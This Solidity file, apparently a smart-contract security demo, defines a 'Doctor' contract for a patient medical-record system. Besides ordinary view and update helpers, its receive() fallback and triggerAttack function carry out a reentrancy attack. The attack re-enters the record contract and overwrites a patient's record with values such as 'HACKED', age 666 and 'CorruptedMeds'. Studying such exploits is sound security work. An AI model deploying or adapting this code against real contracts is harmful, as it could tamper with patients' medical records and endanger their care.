// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPatientInfo 
{
    struct MedicalRecord 
    {
        string name;
        uint256 age;
        string bloodGroup;
        string allergies;
        string medications;
        string surgeries;
        string physicianNotes;
    }

    function updateMedicalRecord(
        address patient,
        uint256 patientId,
        string memory name,
        uint256 age,
        string memory bloodGroup,
        string memory allergies,
        string memory medications,
        string memory surgeries,
        string memory physicianNotes,
        address doctorCaller
    ) external;

    function getRecord(address patient, uint256 patientId)
        external
        view
        returns (MedicalRecord memory);
}

contract Doctor 
{
    IPatientInfo public patientContract;

    address public targetPatient;
    uint256 public targetPatientId;
    bool public attackStarted;

    constructor(address _patientContract) 
    {
        patientContract = IPatientInfo(_patientContract);
    }

    // Reentrancy entry point – malicious override
    receive() external payable {
        if (!attackStarted) {
            attackStarted = true;

            patientContract.updateMedicalRecord(
                targetPatient,
                targetPatientId,
                "HACKED",
                666,
                "A+",
                "N/A",
                "CorruptedMeds",
                "N/A",
                "Maliciously injected data",
                address(this)
            );
        }
    }

    // Triggers the reentrancy attack
    function triggerAttack(address _patient, uint256 _patientId) public payable {
        targetPatient = _patient;
        targetPatientId = _patientId;
        attackStarted = false;

        (bool success, ) = payable(address(patientContract)).call{value: msg.value}(
            abi.encodeWithSignature("dangerousInteraction(address)", address(this))
        );
        require(success, "Attack failed");
    }

    
    function viewMedicalRecord(address patient, uint256 patientId)
        external
        view
        returns (IPatientInfo.MedicalRecord memory)
    {
        return patientContract.getRecord(patient, patientId);
    }

    
    function viewMedicalRecordLineWise(address patient, uint256 patientId)
        external
        view
        returns (
            string memory name,
            uint256 age,
            string memory bloodGroup,
            string memory allergies,
            string memory medications,
            string memory surgeries,
            string memory physicianNotes
        )
    {
        IPatientInfo.MedicalRecord memory record = patientContract.getRecord(patient, patientId);
        return (
            record.name,
            record.age,
            record.bloodGroup,
            record.allergies,
            record.medications,
            record.surgeries,
            record.physicianNotes
        );
    }

    
    function updateMedicationsAndNotes(
        address patient,
        uint256 patientId,
        string memory newMedications,
        string memory newNotes
    ) external {
        IPatientInfo.MedicalRecord memory record = patientContract.getRecord(patient, patientId);

        
        string memory medicationsToUpdate = bytes(newMedications).length > 0
            ? newMedications
            : record.medications;

        string memory notesToUpdate = bytes(newNotes).length > 0
            ? newNotes
            : record.physicianNotes;

        
        patientContract.updateMedicalRecord(
            patient,
            patientId,
            record.name,
            record.age,
            record.bloodGroup,
            record.allergies,
            medicationsToUpdate,
            record.surgeries,
            notesToUpdate,
            address(this)
        );
    }
}
